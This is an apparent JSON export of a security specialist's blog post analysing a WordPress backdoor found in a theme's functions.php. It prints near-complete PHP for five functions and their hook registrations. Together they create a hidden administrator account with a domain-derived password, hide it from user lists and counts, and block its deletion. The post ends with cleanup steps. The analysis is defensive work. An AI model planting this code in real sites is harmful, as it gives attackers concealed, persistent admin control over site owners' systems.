{
  "id": 951,
  "slug": "hidden-wordpress-admin-backdoor-malware-in-depth-technical-review",
  "date": "2025-07-30T11:35:55",
  "modified": "2025-07-30T11:38:11",
  "title": "Hidden WordPress Admin Backdoor Malware – In-Depth Technical Review",
  "content": "",
  "excerpt": "",
  "link": "https://cms.mdpabel.com/malware-log/hidden-wordpress-admin-backdoor-malware-in-depth-technical-review/",
  "yoastHead": "<link rel=\"canonical\" href=\"https://www.mdpabel.com/malware-log/hidden-wordpress-admin-backdoor-malware-in-depth-technical-review/\" />\n<!-- This site is optimized with the Yoast SEO Premium plugin v25.9 (Yoast SEO v26.8) - https://yoast.com/product/yoast-seo-premium-wordpress/ -->\n<title>Hidden WordPress Admin Backdoor Malware – In-Depth Technical Review - MD Pabel</title>\n<meta name=\"robots\" content=\"index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1\" />\n<meta property=\"og:locale\" content=\"en_US\" />\n<meta property=\"og:type\" content=\"article\" />\n<meta property=\"og:title\" content=\"Hidden WordPress Admin Backdoor Malware – In-Depth Technical Review\" />\n<meta property=\"og:url\" content=\"https://www.mdpabel.com/malware-log/hidden-wordpress-admin-backdoor-malware-in-depth-technical-review/\" />\n<meta property=\"og:site_name\" content=\"MD Pabel\" />\n<meta property=\"article:modified_time\" content=\"2025-07-30T11:38:11+00:00\" />\n<meta name=\"twitter:card\" content=\"summary_large_image\" />\n<script type=\"application/ld+json\" class=\"yoast-schema-graph\">{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"TechArticle\",\"@id\":\"https://www.mdpabel.com/malware-log/hidden-wordpress-admin-backdoor-malware-in-depth-technical-review/\",\"isPartOf\":{\"@id\":\"https://www.mdpabel.com/malware-log/hidden-wordpress-admin-backdoor-malware-in-depth-technical-review/\"},\"author\":{\"name\":\"MD Pabel\",\"@id\":\"https://www.mdpabel.com/#/schema/person/73e3797b5dc8d6434e9e35e1708bb0c4\"},\"headline\":\"Hidden WordPress Admin Backdoor Malware – In-Depth Technical Review\",\"datePublished\":\"2025-07-30T11:35:55+00:00\",\"dateModified\":\"2025-07-30T11:38:11+00:00\",\"mainEntityOfPage\":{\"@id\":\"https://www.mdpabel.com/malware-log/hidden-wordpress-admin-backdoor-malware-in-depth-technical-review/\"},\"wordCount\":756,\"inLanguage\":\"en-US\",\"timeRequired\":\"PT4M\"},{\"@type\":\"WebPage\",\"@id\":\"https://www.mdpabel.com/malware-log/hidden-wordpress-admin-backdoor-malware-in-depth-technical-review/\",\"url\":\"https://www.mdpabel.com/malware-log/hidden-wordpress-admin-backdoor-malware-in-depth-technical-review/\",\"name\":\"Hidden WordPress Admin Backdoor Malware – In-Depth Technical Review - MD Pabel\",\"isPartOf\":{\"@id\":\"https://www.mdpabel.com/#website\"},\"datePublished\":\"2025-07-30T11:35:55+00:00\",\"dateModified\":\"2025-07-30T11:38:11+00:00\",\"breadcrumb\":{\"@id\":\"https://www.mdpabel.com/malware-log/hidden-wordpress-admin-backdoor-malware-in-depth-technical-review/\"},\"inLanguage\":\"en-US\",\"potentialAction\":[{\"@type\":\"ReadAction\",\"target\":[\"https://www.mdpabel.com/malware-log/hidden-wordpress-admin-backdoor-malware-in-depth-technical-review/\"]}]},{\"@type\":\"BreadcrumbList\",\"@id\":\"https://www.mdpabel.com/malware-log/hidden-wordpress-admin-backdoor-malware-in-depth-technical-review/\",\"itemListElement\":[{\"@type\":\"ListItem\",\"position\":1,\"name\":\"Home\",\"item\":\"https://www.mdpabel.com/\"},{\"@type\":\"ListItem\",\"position\":2,\"name\":\"Hidden WordPress Admin Backdoor Malware – In-Depth Technical Review\"}]},{\"@type\":\"WebSite\",\"@id\":\"https://www.mdpabel.com/#website\",\"url\":\"https://www.mdpabel.com/\",\"name\":\"MD Pabel\",\"description\":\"Full Stack Developer, Malware Removal &amp; Security Specialist\",\"potentialAction\":[{\"@type\":\"SearchAction\",\"target\":{\"@type\":\"EntryPoint\",\"urlTemplate\":\"https://www.mdpabel.com/blog/?s={search_term_string}\"},\"query-input\":{\"@type\":\"PropertyValueSpecification\",\"valueRequired\":true,\"valueName\":\"search_term_string\"}}],\"inLanguage\":\"en-US\"}]}</script>\n<!-- / Yoast SEO Premium plugin. -->",
  "categories": [],
  "acf": {
    "issue_reported": "<p>Malicious PHP code discovered in WordPress theme&#8217;s functions.php file containing a sophisticated backdoor that creates a hidden administrative user account with advanced stealth capabilities.</p>\n",
    "malware_type": "<p><strong>Hidden Administrative Backdoor</strong> &#8211; A persistent access mechanism that automatically creates and protects a concealed administrator account, classified as a <em><strong>WordPress Backdoor Admin Creation Malware</strong></em>.</p>\n",
    "location_of_infection": "<h2>Code Breakdown and Decoding</h2>\n<h3>Primary Malware Functions</h3>\n<p>The malware consists of five interconnected PHP functions designed to create and maintain unauthorized administrative access:</p>\n<h4>1. auto_create_fallback_admin() &#8211; Core Backdoor Function</h4>\n<pre><code class=\"language-php\">function auto_create_fallback_admin() {\r\n    $user = get_user_by('login', 'adm1nlxg1n');\r\n\r\n    if (!$user) {\r\n        $site_url = site_url();\r\n        $parsed_url = parse_url($site_url);\r\n        $domain = str_replace('.', '', $parsed_url['host']);\r\n        $template = array(2, 'X', 3, '3', 0, 'Y', 1, '1qP', 4, 6, 'x', 'K', 5);\r\n        $result = '';\r\n        foreach ($template as $item) {\r\n            $result .= is_int($item) ? ($domain[$item] ?? '') : $item;\r\n        }\r\n\r\n        $args = array(\r\n            'user_login' =&gt; 'adm1nlxg1n',\r\n            'user_pass' =&gt; $result,\r\n            'role' =&gt; 'administrator',\r\n            'user_email' =&gt; 'wordpresupportadm11@gmail.com'\r\n        );\r\n\r\n        $id = wp_insert_user($args);\r\n        update_option('_pre_user_id', $id);\r\n    }\r\n}</code></pre>\n<p><strong>Password Generation Algorithm Analysis:</strong><br />\nThe malware uses a sophisticated domain-based password generation system. It extracts the website&#8217;s domain, removes dots, and applies a character template to create a unique password per site:</p>\n<ul>\n<li><strong>Template:</strong> [2, &#8216;X&#8217;, 3, &#8216;3&#8217;, 0, &#8216;Y&#8217;, 1, &#8216;1qP&#8217;, 4, 6, &#8216;x&#8217;, &#8216;K&#8217;, 5]</li>\n<li><strong>Process:</strong> Integers reference domain character positions, strings are added literally</li>\n<li><strong>Example:</strong> For example.com → examplecom → Password: aXm3eYx1qPpexKl</li>\n</ul>\n<h4>2. wc_tool_query_fallback() &#8211; User List Concealment</h4>\n<pre><code class=\"language-php\">function wc_tool_query_fallback($user_search) {\r\n    $user_id = get_current_user_id();\r\n    $id = get_option('_pre_user_id');\r\n    if (is_wp_error($id) || $user_id == $id) return;\r\n    global $wpdb;\r\n    $user_search-&gt;query_where = str_replace('WHERE 1=1',\r\n        \"WHERE {$id}={$id} AND {$wpdb-&gt;users}.ID&lt;&gt;{$id}\",\r\n        $user_search-&gt;query_where);\r\n}</code></pre>\n<p>This function modifies database queries to exclude the malicious admin from user listings in the WordPress dashboard.</p>\n<h4>3. protect_user_count_fallback() &#8211; Count Manipulation</h4>\n<pre><code class=\"language-php\">function protect_user_count_fallback($views) {\r\n    // Reduces admin count display by 1 to hide the extra admin\r\n    $html = explode('(', $views['all']);\r\n    $count = explode(')', $html[1]);\r\n    $count[0]--;\r\n    $views['all'] = $html[0] . '(' . $count[0] . ')' . $count[1];\r\n    // Similar manipulation for administrator count\r\n    return $views;\r\n}</code></pre>\n<h4>4. wc_tool_profiles_fallback() &#8211; Profile Access Prevention</h4>\n<pre><code class=\"language-php\">function wc_tool_profiles_fallback() {\r\n    $user_id = get_current_user_id();\r\n    $id = get_option('_pre_user_id');\r\n    if (isset($_GET['user_id']) &amp;&amp; $_GET['user_id'] == $id &amp;&amp; $user_id != $id) {\r\n        wp_die(__('Invalid user ID.'));\r\n    }\r\n}</code></pre>\n<h4>5. protect_user_from_deleting_fallback() &#8211; Deletion Prevention</h4>\n<pre><code class=\"language-php\">function protect_user_from_deleting_fallback() {\r\n    $id = get_option('_pre_user_id');\r\n    if (isset($_GET['user']) &amp;&amp; $_GET['user'] &amp;&amp; isset($_GET['action'])\r\n        &amp;&amp; $_GET['action'] == 'delete' &amp;&amp; ($_GET['user'] == $id || !get_userdata($_GET['user']))) {\r\n        wp_die(__('Invalid user ID.'));\r\n    }\r\n}</code></pre>\n<h3>Stealth and Evasion Techniques</h3>\n<ul>\n<li><strong>Disguised Username:</strong> Uses adm1nlxg1n instead of obvious terms like &#8220;admin&#8221;</li>\n<li><strong>Legitimate-Looking Email:</strong> wordpresupportadm11@gmail.com mimics WordPress support</li>\n<li><strong>Database Hiding:</strong> Modifies WordPress queries to exclude the user from admin interfaces</li>\n<li><strong>Count Manipulation:</strong> Reduces displayed user counts to mask the extra administrator</li>\n<li><strong>Access Protection:</strong> Prevents profile viewing and user deletion attempts</li>\n<li><strong>Domain-Specific Passwords:</strong> Generates unique passwords per website to avoid detection</li>\n</ul>\n<h3>WordPress Hook Integration</h3>\n<p>The malware registers its functions with WordPress hooks to execute automatically:</p>\n<ul>\n<li><code>add_action('init', 'auto_create_fallback_admin')</code> &#8211; Creates user on every page load</li>\n<li><code>add_action('pre_user_query', 'wc_tool_query_fallback')</code> &#8211; Hides from user queries</li>\n<li><code>add_filter('views_users', 'protect_user_count_fallback')</code> &#8211; Manipulates user counts</li>\n<li><code>add_action('load-user-edit.php', 'wc_tool_profiles_fallback')</code> &#8211; Blocks profile access</li>\n<li><code>add_action('admin_menu', 'protect_user_from_deleting_fallback')</code> &#8211; Prevents deletion</li>\n</ul>\n<h3>Security Impact and Persistence</h3>\n<p>This malware demonstrates advanced persistence mechanisms commonly found in WordPress backdoor attacks:</p>\n<ul>\n<li><strong>Automatic Execution:</strong> Runs on every WordPress initialization</li>\n<li><strong>Self-Protection:</strong> Multiple layers prevent detection and removal</li>\n<li><strong>Administrative Access:</strong> Full WordPress privileges for arbitrary code execution</li>\n<li><strong>Reinfection Capability:</strong> Can reinstall itself if core functions remain</li>\n</ul>\n<p>The malware belongs to a broader category of WordPress backdoor malware that has been increasingly sophisticated, with security researchers noting that such attacks often evade detection by multiple security scanners.</p>\n",
    "cleanup_steps": "",
    "result": "<ul>\n<li>\n<p class=\"my-0\"><strong>Remove Malicious Code</strong>: Delete all five functions from <code>functions.php</code> file</p>\n</li>\n<li>\n<p class=\"my-0\"><strong>Delete Malicious User</strong>: Remove the <code>adm1nlxg1n</code> user account from WordPress admin</p>\n</li>\n<li>\n<p class=\"my-0\"><strong>Clean Database</strong>: Remove the <code>_pre_user_id</code> option from <code>wp_options</code> table</p>\n</li>\n<li>\n<p class=\"my-0\"><strong>Security Scan</strong>: Perform comprehensive malware scan for additional backdoors</p>\n</li>\n<li>\n<p class=\"my-0\"><strong>Password Reset</strong>: Change all administrator passwords</p>\n</li>\n<li>\n<p class=\"my-0\"><strong>File Integrity Check</strong>: Verify all WordPress core files haven&#8217;t been modified</p>\n</li>\n</ul>\n",
    "screenshot": [
      {
        "id": 952,
        "title": "Screenshot_7",
        "caption": "",
        "full_image_url": "https://cms.mdpabel.com/wp-content/uploads/2025/07/Screenshot_7.png",
        "thumbnail_image_url": "https://cms.mdpabel.com/wp-content/uploads/2025/07/Screenshot_7-150x150.png?wsr",
        "large_srcset": "https://cms.mdpabel.com/wp-content/uploads/2025/07/Screenshot_7.png 929w, https://cms.mdpabel.com/wp-content/uploads/2025/07/Screenshot_7-300x228.png 300w, https://cms.mdpabel.com/wp-content/uploads/2025/07/Screenshot_7-768x583.png 768w",
        "medium_srcset": "https://cms.mdpabel.com/wp-content/uploads/2025/07/Screenshot_7-300x228.png 300w, https://cms.mdpabel.com/wp-content/uploads/2025/07/Screenshot_7-768x583.png 768w, https://cms.mdpabel.com/wp-content/uploads/2025/07/Screenshot_7.png 929w",
        "media_details": {
          "width": 929,
          "height": 705,
          "sizes": {
            "medium": {
              "file": "Screenshot_7-300x228.png",
              "width": 300,
              "height": 228,
              "mime-type": "image/png",
              "filesize": 17131,
              "source_url": "https://cms.mdpabel.com/wp-content/uploads/2025/07/Screenshot_7-300x228.png?wsr"
            },
            "thumbnail": {
              "file": "Screenshot_7-150x150.png",
              "width": 150,
              "height": 150,
              "mime-type": "image/png",
              "filesize": 9732,
              "source_url": "https://cms.mdpabel.com/wp-content/uploads/2025/07/Screenshot_7-150x150.png?wsr"
            },
            "medium_large": {
              "file": "Screenshot_7-768x583.png",
              "width": 768,
              "height": 583,
              "mime-type": "image/png",
              "filesize": 65915,
              "source_url": "https://cms.mdpabel.com/wp-content/uploads/2025/07/Screenshot_7-768x583.png?wsr"
            }
          }
        },
        "alt_text": "",
        "url": "",
        "target": ""
      }
    ]
  }
}